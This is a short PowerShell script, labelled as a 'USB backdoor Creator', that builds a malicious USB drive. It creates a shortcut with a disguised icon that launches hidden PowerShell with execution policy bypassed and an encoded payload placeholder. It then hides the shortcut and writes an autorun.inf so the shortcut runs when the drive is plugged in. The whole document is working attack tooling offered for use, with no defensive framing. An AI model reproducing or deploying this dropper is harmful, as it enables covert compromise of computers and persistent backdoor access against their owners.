# USB backdoor Creator - USB WMI event is monitored and once USB is connected, this script is executed inside the USB and create backdoor. 
$WshShell = New-Object -comObject WScript.Shell
$Shortcut = $WshShell.CreateShortcut("LNKFILE")
$Shortcut.iconlocation = "%SystemRoot%\system32\SHELL32.dll,7"
$Shortcut.TargetPath = "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
$Shortcut.arguments = "-Exec Bypass -Nop -sta -W Hidden -Enc ENCODED "
$Shortcut.Save()
#move $USBDrive\* $USBDrive\container
# Hide folder
attrib +h LNKFILE
$inf = @"
[AutoRun]
open=LNKFILE
icon=LNKICON
shellexecute=LNKFILE
UseAutoPlay=1
"@
set-content .\autorun.inf -Value $inf